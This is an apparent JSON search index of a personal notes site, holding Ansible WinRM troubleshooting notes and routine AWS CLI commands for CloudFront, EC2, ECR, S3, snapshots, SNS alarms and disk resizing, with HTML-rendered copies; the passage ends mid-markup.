[{"categories":null,"contents":" Lookup # List all plugins ansible-doc -t lookup -l # Use `ansible-doc -t lookup \u0026lt;plugin\u0026gt;` to see detail ansible-doc -t lookup ping winrm - console output 在 hyper-v 那台機器 Enable Winrm 之後 一直出現下面的錯誤。 在 group 加上一行即可\nansible_winrm_transport=ntlm\nhyper-v01 | UNREACHABLE! =\u0026gt; { \u0026#34;changed\u0026#34;: false, \u0026#34;msg\u0026#34;: \u0026#34;ssl: the specified credentials were rejected by the server\u0026#34;, \u0026#34;unreachable\u0026#34;: true } - /etc/ansible/hosts ansible_user=administrator ansible_password=password ansible_port=5986 ansible_connection=winrm ansible_winrm_server_cert_validation=ignore ansible_winrm_transport=ntlm ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/notes/bash/ansible/","summary":"\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eLookup\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# List all plugins\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eansible-doc -t lookup -l\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Use `ansible-doc -t lookup \u0026lt;plugin\u0026gt;` to see detail\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eansible-doc -t lookup ping\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003ewinrm\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003ch6 id=\"--console-output\"\u003e- console output\u003c/h6\u003e\n\u003cp\u003e在 hyper-v 那台機器 Enable Winrm 之後 一直出現下面的錯誤。\n在 group 加上一行即可\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eansible_winrm_transport=ntlm\u003c/code\u003e\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-json\" data-lang=\"json\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#960050;background-color:#1e0010\"\u003ehyper-v\u003c/span\u003e\u003cspan style=\"color:#ae81ff\"\u003e01\u003c/span\u003e \u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e|\u003c/span\u003e \u003cspan style=\"color:#960050;background-color:#1e0010\"\u003eUNREACHABLE!\u003c/span\u003e \u003cspan style=\"color:#960050;background-color:#1e0010\"\u003e=\u0026gt;\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003e\u0026#34;changed\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#66d9ef\"\u003efalse\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003e\u0026#34;msg\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;ssl: the specified credentials were rejected by the server\u0026#34;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#f92672\"\u003e\u0026#34;unreachable\u0026#34;\u003c/span\u003e: \u003cspan style=\"color:#66d9ef\"\u003etrue\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch6 id=\"--etcansiblehosts\"\u003e- /etc/ansible/hosts\u003c/h6\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-ini\" data-lang=\"ini\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003eansible_user\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003eadministrator\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003eansible_password\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003epassword\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003eansible_port\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e5986\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003eansible_connection\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003ewinrm\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003eansible_winrm_server_cert_validation\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003eignore\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003eansible_winrm_transport\u003c/span\u003e\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003entlm\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e","tags":null,"title":"Ansible Command"},{"categories":null,"contents":" CloudFront # list distributions aws cloudfront list-distributions --query \u0026#39;*.Items[*].[Comment,Id,Aliases.Items[0],DefaultCacheBehavior.TargetOriginId]\u0026#39; --output table # create invalidation aws cloudfront create-invalidation --distribution-id EATDVGD171BHDS1 --paths \u0026#34;/*\u0026#34; ## check cloudfornt log enable or not for i in $(aws cloudfront list-distributions --output table --query \u0026#39;DistributionList.Items[*].Id\u0026#39; --profile route53 | sed \u0026#39;1,3d;$d\u0026#39; | awk \u0026#39;{print $2}\u0026#39;) do result=$(aws cloudfront get-distribution --id ${i} --query \u0026#39;Distribution.DistributionConfig.Logging\u0026#39; --profile route53 | jq .Enabled) if [[ \u0026#34;${result}\u0026#34; != \u0026#34;true\u0026#34; ]];then echo ${i} fi done EC2 # list aws ec2 describe-instances --query \u0026#39;Reservations[*].Instances[*].[Tags[0].Value,InstanceId]\u0026#39; --output table --page-size 100 ECR # Get password and login to 12345.dkr.ecr.ap-northeast-1.amazonaws.com aws ecr get-login-password | docker login --username AWS --password-stdin 12345.dkr.ecr.ap-northeast-1.amazonaws.com S3 # Copy local file to S3 aws s3 cp ./pic.png s3://bucket_name/dir/ # Sync local local_dir to S3 aws s3 sync local_dir s3://bucket_name --exclude \u0026#39;gameConfig.json\u0026#39; --acl public-read --delete snapshot # list aws ec2 describe-snapshots \\ --owner-ids self \\ --query \u0026#34;Snapshots[?(Tags[0].Value==\u0026#39;backend\u0026#39;)].[SnapshotId,VolumeId]\u0026#34; \\ --region ap-northeast-1 # create aws ec2 create-snapshot --volume-id vol-02468851c2bc3bc4b --description \u0026#34;gitlab-$(date +%F)\u0026#34; --region ap-northeast-1 # delete aws ec2 delete-snapshot --snapshot-id snap-1234567890abcdef0 --region ap-northeast-1 sns region=\u0026#39;ap-east-1\u0026#39; account_id=\u0026#39;888886666321\u0026#39; topic=\u0026#39;sa\u0026#39; # create topic aws sns create-topic --name ${topic} # subscribe aws sns subscribe --topic-arn arn:aws:sns:${region}:${account_id}:${topic} --protocol email --notification-endpoint ricky@gmail.com # list aws sns list-subscriptions-by-topic --topic-arn arn:aws:sns:${region}:${account_id}:${topic} # create alarm ### metric-name ##CPUUtilization --\u0026gt;percent ##NetworkIn --\u0026gt;bytes ##NetworkOut --\u0026gt;bytes for line in $(aws ec2 describe-instances --query \u0026#39;Reservations[*].Instances[*].[Tags[0].Value,InstanceId]\u0026#39; --output table --page-size 100) do ID=$(echo ${line}|awk -F \u0026#39;,\u0026#39; \u0026#39;{print $1}\u0026#39;) VALUE=$(echo ${line}|awk -F \u0026#39;,\u0026#39; \u0026#39;{print $2}\u0026#39;) aws cloudwatch put-metric-alarm \\ --alarm-name ${ID}_netout \\ --metric-name NetworkOut \\ --namespace AWS/EC2 \\ --statistic Average \\ --period 300 \\ --threshold 2560000 \\ --comparison-operator GreaterThanOrEqualToThreshold \\ --dimensions \u0026#34;Name=InstanceId,Value=${VALUE}\u0026#34; \\ --evaluation-periods 3 \\ --alarm-actions arn:aws:sns:${region}:${account_id}:${topic} ##--unit Bytes echo \u0026#34;$ID done\u0026#34; done WAF aws wafv2 create-web-acl \\ --name acl_name \\ --scope CLOUDFRONT \\ --default-action Allow={} \\ --visibility-config SampledRequestsEnabled=true,CloudWatchMetricsEnabled=true,MetricName=metric_acl_name \\ --rule Mount S3 Bucket on EC2 references: How to Mount S3 Bucket on Ubuntu 22.04 with S3FS Fuse\n# Installing s3fs-fuse sudo apt-get update \u0026amp;\u0026amp; sudo apt-get install s3fs # Configuring AWS Credentials echo ACCESS_KEY_ID:SECRET_ACCESS_KEY \u0026gt; ${HOME}/.passwd-s3fs chmod 600 ${HOME}/.passwd-s3fs # Mounting the S3 Bucket s3fs mybucketname:/path/to/dir /path/to/local/mountpoint -o passwd_file=${HOME}/.passwd-s3fs # Ensuring Persistent Mounting echo \u0026#39;s3fs#mybucketname:/path/to/dir /path/to/local/mountpoint fuse _netdev,allow_other 0 0\u0026#39; | sudo tee -a /etc/fstab resize disk # 會在 FSTYPE 欄顯示 ext4 或 xfs lsblk -f # 擴大分割區 1 直到填滿整顆磁碟 # apt-get -y install cloud-guest-utils # 內含 growpart growpart /dev/xvda 1 # ext4 # xfs_growfs -d / # xfs resize2fs /dev/xvda1 ","date":"January 1, 0001","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/notes/aws/command/","summary":"\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eCloudFront\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# list distributions\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eaws cloudfront list-distributions --query \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;*.Items[*].[Comment,Id,Aliases.Items[0],DefaultCacheBehavior.TargetOriginId]\u0026#39;\u003c/span\u003e --output table\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# create invalidation\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eaws cloudfront create-invalidation --distribution-id  EATDVGD171BHDS1  --paths \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;/*\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e## check cloudfornt log enable or not\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e i in \u003cspan style=\"color:#66d9ef\"\u003e$(\u003c/span\u003eaws cloudfront list-distributions --output table --query \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;DistributionList.Items[*].Id\u0026#39;\u003c/span\u003e --profile route53 | sed \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;1,3d;$d\u0026#39;\u003c/span\u003e | awk \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;{print $2}\u0026#39;\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003edo\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  result\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003e$(\u003c/span\u003eaws cloudfront get-distribution --id \u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003ei\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e --query \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;Distribution.DistributionConfig.Logging\u0026#39;\u003c/span\u003e --profile route53 | jq .Enabled\u003cspan style=\"color:#66d9ef\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e[[\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003eresult\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e !\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;true\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e]]\u003c/span\u003e;\u003cspan style=\"color:#66d9ef\"\u003ethen\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    echo \u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003ei\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e  \u003cspan style=\"color:#66d9ef\"\u003efi\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003edone\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eEC2\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# list\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eaws ec2 describe-instances --query \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;Reservations[*].Instances[*].[Tags[0].Value,InstanceId]\u0026#39;\u003c/span\u003e --output table --page-size \u003cspan style=\"color:#ae81ff\"\u003e100\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eECR\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Get password and login to 12345.dkr.ecr.ap-northeast-1.amazonaws.com\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eaws ecr get-login-password | docker login --username AWS --password-stdin 12345.dkr.ecr.ap-northeast-1.amazonaws.com\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003eS3\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Copy local file to S3\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eaws s3 cp ./pic.png s3://bucket_name/dir/\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# Sync local local_dir to S3\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eaws s3 sync local_dir s3://bucket_name --exclude \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;gameConfig.json\u0026#39;\u003c/span\u003e --acl public-read --delete\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003esnapshot\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# list\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eaws ec2 describe-snapshots \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e        --owner-ids self \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e        --query \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;Snapshots[?(Tags[0].Value==\u0026#39;backend\u0026#39;)].[SnapshotId,VolumeId]\u0026#34;\u003c/span\u003e \u003cspan style=\"color:#ae81ff\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#ae81ff\"\u003e\u003c/span\u003e        --region ap-northeast-1\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# create\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eaws ec2 create-snapshot --volume-id vol-02468851c2bc3bc4b --description \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;gitlab-\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003e$(\u003c/span\u003edate +%F\u003cspan style=\"color:#66d9ef\"\u003e)\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e --region ap-northeast-1\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# delete\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eaws ec2 delete-snapshot --snapshot-id snap-1234567890abcdef0 --region ap-northeast-1\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003c/div\u003e\n            \u003c/div\u003e\n        \n    \u003c/div\u003e\n\u003c/div\u003e\n\n\u003cdiv class=\"note-card \"\u003e\n    \u003cdiv class=\"item\"\u003e\n        \u003ch5 class=\"note-title\"\u003e\u003cspan\u003esns\u003c/span\u003e\u003c/h5\u003e\n        \n            \u003cdiv class=\"card\"\u003e\n                \u003cdiv class=\"card-body\"\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eregion\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ap-east-1\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eaccount_id\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;888886666321\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003etopic\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;sa\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# create topic\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eaws sns create-topic --name \u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003etopic\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# subscribe\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eaws sns subscribe --topic-arn arn:aws:sns:\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003eregion\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e:\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003eaccount_id\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e:\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003etopic\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e --protocol email --notification-endpoint ricky@gmail.com\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# list\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eaws sns list-subscriptions-by-topic --topic-arn arn:aws:sns:\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003eregion\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e:\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003eaccount_id\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e:\u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003etopic\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e# create alarm\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e### metric-name\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e##CPUUtilization --\u0026gt;percent\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e##NetworkIn --\u0026gt;bytes\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e##NetworkOut --\u0026gt;bytes\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e line in \u003cspan style=\"color:#66d9ef\"\u003e$(\u003c/span\u003eaws ec2 describe-instances --query \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;Reservations[*].Instances[*].[Tags[0].Value,InstanceId]\u0026#39;\u003c/span\u003e --output table --page-size 100\u003cspan style=\"color:#66d9ef\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003edo\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    ID\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003e$(\u003c/span\u003eecho \u003cspan style=\"color:#e6db74\"\u003e${\u003c/span\u003eline\u003cspan 